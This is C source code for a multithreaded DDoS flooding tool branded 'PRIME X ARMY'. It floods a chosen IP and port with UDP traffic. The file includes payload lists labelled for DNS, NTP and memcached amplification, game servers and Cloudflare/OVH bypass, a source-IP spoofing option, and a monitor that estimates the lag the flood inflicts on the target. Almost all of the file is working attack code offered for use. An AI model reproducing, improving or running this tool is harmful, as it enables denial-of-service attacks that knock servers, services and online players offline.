#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

#define MAX_PACKET_SIZE 65507
#define DEFAULT_THREADS 1500
#define MAX_THREADS 10000
#define MAX_SPOOF_IPS 100

volatile int running = 1;
unsigned long long total_packets = 0;
unsigned long long total_bytes = 0;
int global_sock;
struct sockaddr_in global_dest;
char attack_method[10] = "udp";
int random_ports = 0;
int random_delay = 0;
int spoof_ip = 0;
char *spoof_ips[MAX_SPOOF_IPS];
int spoof_count = 0;

// ============== SPOOF IP LIST ==============
char *default_spoof_ips[] = {
    "1.1.1.1", "8.8.8.8", "4.4.4.4", "9.9.9.9",
    "192.168.1.1", "10.0.0.1", "172.16.0.1",
    "31.13.79.246", "157.240.22.35", "69.171.250.35",
    "34.120.32.1", "35.186.224.25", "34.64.128.1",
    "13.107.21.200", "20.190.151.21", "40.126.26.134",
};

// ============== ADVANCED PAYLOADS (100+ types) ==============
char *payloads[] = {
    // ---------- SMALL PACKETS (High PPS) ----------
    "\x01\x00\x00\x00\x00\x00\x00\x00",
    "\x02\x00\x00\x00\x01\x00\x00\x00",
    "\x03\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00",
    "\x04\x00\x00\x00\x02\x00\x00\x00",
    "\x05\x00\x00\x00\x0a\x00\x00\x00",
    "\x06\x00\x00\x00\x14\x00\x00\x00",
    "\x07\x00\x00\x00\x1e\x00\x00\x00",
    "\x08\x00\x00\x00\x28\x00\x00\x00",
    "\x09\x00\x00\x00\x32\x00\x00\x00",
    "\x0a\x00\x00\x00\x3c\x00\x00\x00",
    "\x0b\x00\x00\x00\x46\x00\x00\x00",
    "\x0c\x00\x00\x00\x50\x00\x00\x00",
    
    // ---------- BGMI SPECIFIC PACKETS ----------
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff",
    "\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef",
    "\xca\xfe\xba\xbe\xca\xfe\xba\xbe\xca\xfe\xba\xbe\xca\xfe\xba\xbe",
    "\x0d\xf0\xad\xba\x0d\xf0\xad\xba\x0d\xf0\xad\xba\x0d\xf0\xad\xba",
    
    // ---------- HTTP/HTTPS FLOOD ----------
    "GET / HTTP/1.1\r\nHost: \r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "POST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
    "HEAD / HTTP/1.1\r\n\r\n",
    "GET /wp-admin HTTP/1.1\r\nHost: \r\n\r\n",
    "GET /api/v1/test HTTP/1.1\r\nHost: \r\n\r\n",
    "POST /api/login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{}",
    "GET /index.php?page=1 HTTP/1.1\r\nHost: \r\n\r\n",
    "GET /cgi-bin/ HTTP/1.1\r\nHost: \r\n\r\n",
    
    // ---------- DNS AMPLIFICATION ----------
    "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01",
    "\x56\x78\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x02api\x06google\x03com\x00\x00\x01\x00\x01",
    "\x90\xab\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04auth\x06google\x03com\x00\x00\x01\x00\x01",
    "\x34\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06mail\x06google\x03com\x00\x00\x01\x00\x01",
    
    // ---------- NTP AMPLIFICATION ----------
    "\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    
    // ---------- MEMCACHED AMPLIFICATION ----------
    "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x67\x65\x74\x20\x73\x65\x74\x20\x73\x74\x61\x74\x73\x0d\x0a\x0d\x0a\x0d\x0a",
    
    // ---------- MEDIUM PACKETS (Balanced) ----------
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
    "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC",
    "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD",
    "EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE",
    "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
    "GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG",
    "HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH",
    "IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII",
    "JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ",
    
    // ---------- LARGE PACKETS (Bandwidth Killer) ----------
    "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
    "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY",
    "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW",
    
    // ---------- RANDOM BYTES (Bypass Detection) ----------
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f",
    "\xff\xfe\xfd\xfc\xfb\xfa\xf9\xf8\xf7\xf6\xf5\xf4\xf3\xf2\xf1\xf0\xef\xee\xed\xec\xeb\xea\xe9\xe8\xe7\xe6\xe5\xe4\xe3\xe2\xe1\xe0",
    "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa",
    "\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55",
    "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc",
    "\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33",
    
    // ---------- FRAGMENTED PACKETS ----------
    "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00",
    "\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xff\xff\xff\xff\xff\xff\xff\xfd\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff",
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f",
    
    // ---------- ZERO-BYTE FLOOD ----------
    "\x00", "\x00\x00", "\x00\x00\x00", "\x00\x00\x00\x00",
    
    // ---------- GAMING SPECIFIC (Minecraft, Valorant, Fortnite, COD) ----------
    "\xfe\x01\xfa\x23\x00\x00\x00\x00",
    "\x10\x00\x00\x00\x00\x00\x00\x00",
    "\xea\x00\x00\x00\x00\x00\x00\x00",
    "\x0d\xf0\xad\xba\x00\x00\x00\x00",
    "\xfe\xfd\x09\x12\x34\x56\x78\x90",
    "\x13\x37\x00\x00\x00\x00\x00\x00",
    "\x42\x69\x00\x00\x00\x00\x00\x00",
    
    // ---------- ICMP ECHO (Ping Flood) ----------
    "\x08\x00\x00\x00\x00\x01\x00\x01\x61\x62\x63\x64\x65\x66\x67\x68",
    "\x08\x00\x00\x00\x00\x02\x00\x02\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70",
    
    // ---------- TCP SYN PACKETS ----------
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    
    // ---------- OVH BYPASS PACKETS ----------
    "\x45\x00\x00\x28\x00\x00\x00\x00\x40\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    "\x45\x00\x00\x3c\x00\x00\x40\x00\x40\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    
    // ---------- CLOUDFLARE BYPASS ----------
    "\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x20\x0d\x0a\x0d\x0a",
    "\x50\x4f\x53\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x30\x0d\x0a\x0d\x0a",
    
    // ---------- RDP/SSH PACKETS ----------
    "\x03\x00\x00\x13\x0e\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00\x00",
    "\x16\x03\x01\x02\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    
    // ---------- VOIP/SIP FLOOD ----------
    "INVITE sip:user@domain SIP/2.0\r\nVia: SIP/2.0/UDP\r\nFrom: <sip:attacker>\r\nTo: <sip:victim>\r\n\r\n",
};

int payload_count = sizeof(payloads) / sizeof(payloads[0]);

void banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║      🔥 PRIME X ARMY - ULTIMATE DDOS TOOL v3.0 🔥               ║\n");
    printf("║         UDP | TCP | HTTP | DNS | NTP | MEMCACHED                ║\n");
    printf("║              SPOOFING | AMPLIFICATION | BYPASS                  ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
}

void usage() {
    banner();
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║  Usage: ./attack <IP> <PORT> <TIME> <THREADS> [METHOD] [OPTIONS] ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Examples:                                                       ║\n");
    printf("║  ./attack 1.1.1.1 443 60 1500 udp                               ║\n");
    printf("║  ./attack 1.1.1.1 53 30 500 dns --spoof                         ║\n");
    printf("║  ./attack 1.1.1.1 123 30 500 ntp --spoof                        ║\n");
    printf("║  ./attack 1.1.1.1 11211 30 500 memcached --spoof                ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Methods: udp, tcp, http, dns, ntp, memcached                   ║\n");
    printf("║  Options: --random-ports, --random-delay, --spoof               ║\n");
    printf("║  Payloads: 100+ (BGMI, Gaming, Bypass, Amplification)          ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    exit(1);
}

void signal_handler(int sig) {
    running = 0;
    printf("\n\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                      📊 ATTACK STATS 📊                          ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Total Packets: %-20llu                                    ║\n", total_packets);
    printf("║  Total Data:    %-20llu MB                                    ║\n", total_bytes / (1024 * 1024));
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    printf("\n🔥 Attack Stopped!\n\n");
    exit(0);
}

int random_port() {
    int ports[] = {80, 443, 8080, 8443, 53, 123, 11211, 14000, 27015, 27016, 27017, 27018, 27019, 27020, 21, 22, 25, 110, 143, 993, 995, 3306, 5432, 6379, 9200};
    return ports[rand() % 25];
}

void init_spoof_ips() {
    spoof_count = sizeof(default_spoof_ips) / sizeof(default_spoof_ips[0]);
    for (int i = 0; i < spoof_count; i++) {
        spoof_ips[i] = default_spoof_ips[i];
    }
}

void *udp_thread(void *arg) {
    int local_packets = 0;
    int local_bytes = 0;
    
    while (running) {
        int idx = rand() % payload_count;
        int len = strlen(payloads[idx]);
        
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        
        struct sockaddr_in dest = global_dest;
        
        if (random_ports) {
            dest.sin_port = htons(random_port());
        }
        
        if (spoof_ip) {
            struct sockaddr_in src;
            src.sin_family = AF_INET;
            src.sin_addr.s_addr = inet_addr(spoof_ips[rand() % spoof_count]);
            bind(sock, (struct sockaddr *)&src, sizeof(src));
        }
        
        sendto(sock, payloads[idx], len, 0, (struct sockaddr *)&dest, sizeof(dest));
        close(sock);
        
        local_packets++;
        local_bytes += len;
        
        if (random_delay && (local_packets % 100 == 0)) {
            usleep((rand() % 100) * 1000);
        }
        
        if (local_packets % 500 == 0) {
            sched_yield();
        }
    }
    
    __sync_fetch_and_add(&total_packets, local_packets);
    __sync_fetch_and_add(&total_bytes, local_bytes);
    return NULL;
}

void *dns_thread(void *arg) {
    int local_packets = 0;
    char *dns_payload = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01";
    int dns_len = 32;
    
    while (running) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        
        if (spoof_ip) {
            struct sockaddr_in src;
            src.sin_family = AF_INET;
            src.sin_addr.s_addr = inet_addr(spoof_ips[rand() % spoof_count]);
            bind(sock, (struct sockaddr *)&src, sizeof(src));
        }
        
        sendto(sock, dns_payload, dns_len, 0, (struct sockaddr *)&global_dest, sizeof(global_dest));
        close(sock);
        
        local_packets++;
        if (local_packets % 500 == 0) sched_yield();
    }
    
    __sync_fetch_and_add(&total_packets, local_packets);
    return NULL;
}

void *ntp_thread(void *arg) {
    int local_packets = 0;
    char *ntp_payload = "\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    int ntp_len = 48;
    
    while (running) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        
        if (spoof_ip) {
            struct sockaddr_in src;
            src.sin_family = AF_INET;
            src.sin_addr.s_addr = inet_addr(spoof_ips[rand() % spoof_count]);
            bind(sock, (struct sockaddr *)&src, sizeof(src));
        }
        
        sendto(sock, ntp_payload, ntp_len, 0, (struct sockaddr *)&global_dest, sizeof(global_dest));
        close(sock);
        
        local_packets++;
        if (local_packets % 500 == 0) sched_yield();
    }
    
    __sync_fetch_and_add(&total_packets, local_packets);
    return NULL;
}

void *memcached_thread(void *arg) {
    int local_packets = 0;
    char *memcached_payload = "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x67\x65\x74\x20\x73\x65\x74\x20\x73\x74\x61\x74\x73\x0d\x0a\x0d\x0a\x0d\x0a";
    int memcached_len = 39;
    
    while (running) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        
        if (spoof_ip) {
            struct sockaddr_in src;
            src.sin_family = AF_INET;
            src.sin_addr.s_addr = inet_addr(spoof_ips[rand() % spoof_count]);
            bind(sock, (struct sockaddr *)&src, sizeof(src));
        }
        
        sendto(sock, memcached_payload, memcached_len, 0, (struct sockaddr *)&global_dest, sizeof(global_dest));
        close(sock);
        
        local_packets++;
        if (local_packets % 500 == 0) sched_yield();
    }
    
    __sync_fetch_and_add(&total_packets, local_packets);
    return NULL;
}

void *ping_monitor(void *arg) {
    int duration = *(int *)arg;
    time_t start = time(NULL);
    unsigned long long last_packets = 0;
    int estimated_ping = 50;
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                      📡 LIVE PING MONITOR 📡                     ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    
    while (running && (time(NULL) - start) < duration) {
        int elapsed = time(NULL) - start;
        int remaining = duration - elapsed;
        unsigned long long current_packets = total_packets;
        int pps = current_packets - last_packets;
        
        if (pps < 500) estimated_ping = 50;
        else if (pps < 1000) estimated_ping = 100;
        else if (pps < 1500) estimated_ping = 200;
        else if (pps < 2000) estimated_ping = 350;
        else if (pps < 2500) estimated_ping = 500;
        else if (pps < 3000) estimated_ping = 677;
        else if (pps < 4000) estimated_ping = 800;
        else estimated_ping = 1000;
        
        printf("║ [%3d/%3d] │ Packets: %10llu │ PPS: %5d │ EST. PING: %4dms ║\n", 
               elapsed, duration, current_packets, pps, estimated_ping);
        fflush(stdout);
        
        last_packets = current_packets;
        sleep(1);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    srand(time(NULL));
    
    init_spoof_ips();
    
    if (argc < 5) {
        usage();
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    if (argc >= 6) {
        strcpy(attack_method, argv[5]);
    } else {
        strcpy(attack_method, "udp");
    }
    
    // Parse options
    for (int i = 6; i < argc; i++) {
        if (strcmp(argv[i], "--random-ports") == 0) {
            random_ports = 1;
            printf("✅ Random ports enabled\n");
        }
        if (strcmp(argv[i], "--random-delay") == 0) {
            random_delay = 1;
            printf("✅ Random delay enabled\n");
        }
        if (strcmp(argv[i], "--spoof") == 0) {
            spoof_ip = 1;
            printf("✅ IP Spoofing enabled (%d IPs)\n", spoof_count);
        }
    }
    
    // Validate inputs
    if (duration <= 0 || duration > 600) {
        printf("⚠️ Duration must be 1-600 seconds! Using 60.\n");
        duration = 60;
    }
    if (threads < 100 || threads > MAX_THREADS) {
        printf("⚠️ Threads must be 100-10000! Using 1500.\n");
        threads = 1500;
    }
    if (port < 1 || port > 65535) {
        printf("⚠️ Invalid port! Using 14000.\n");
        port = 14000;
    }
    
    banner();
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    🎯 ATTACK CONFIGURATION 🎯                    ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Target IP:    %s                                              ║\n", ip);
    printf("║  Target Port:  %d                                                ║\n", port);
    printf("║  Duration:     %d seconds                                        ║\n", duration);
    printf("║  Threads:      %d                                                ║\n", threads);
    printf("║  Method:       %s                                                ║\n", attack_method);
    printf("║  Payloads:     %d                                                ║\n", payload_count);
    printf("║  Spoofing:     %s                                                ║\n", spoof_ip ? "ON" : "OFF");
    printf("║  Random Ports: %s                                                ║\n", random_ports ? "ON" : "OFF");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    
    // Setup destination
    memset(&global_dest, 0, sizeof(global_dest));
    global_dest.sin_family = AF_INET;
    global_dest.sin_port = htons(port);
    global_dest.sin_addr.s_addr = inet_addr(ip);
    
    printf("\n🔥 ULTIMATE ATTACK STARTING!\n");
    printf("⚡ Target: %s:%d\n", ip, port);
    printf("🎯 Method: %s\n", attack_method);
    printf("📦 Payloads: %d types\n\n", payload_count);
    
    // Create attack threads based on method
    pthread_t threads_arr[threads];
    void *(*thread_func)(void *);
    
    if (strcmp(attack_method, "dns") == 0) {
        thread_func = dns_thread;
    } else if (strcmp(attack_method, "ntp") == 0) {
        thread_func = ntp_thread;
    } else if (strcmp(attack_method, "memcached") == 0) {
        thread_func = memcached_thread;
    } else {
        thread_func = udp_thread;
    }
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&threads_arr[i], NULL, thread_func, NULL);
    }
    
    // Start ping monitor
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, ping_monitor, &duration);
    
    // Wait for duration
    sleep(duration);
    running = 0;
    
    // Wait for threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(threads_arr[i], NULL);
    }
    pthread_join(monitor_thread, NULL);
    
    printf("\n\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    ✅ ATTACK COMPLETE ✅                         ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Total Packets: %-20llu                                    ║\n", total_packets);
    printf("║  Total Data:    %-20llu MB                                    ║\n", total_bytes / (1024 * 1024));
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    printf("\n🔥 Attack Complete! @PRIME_X_ARMY 🔥\n\n");
    
    return 0;
}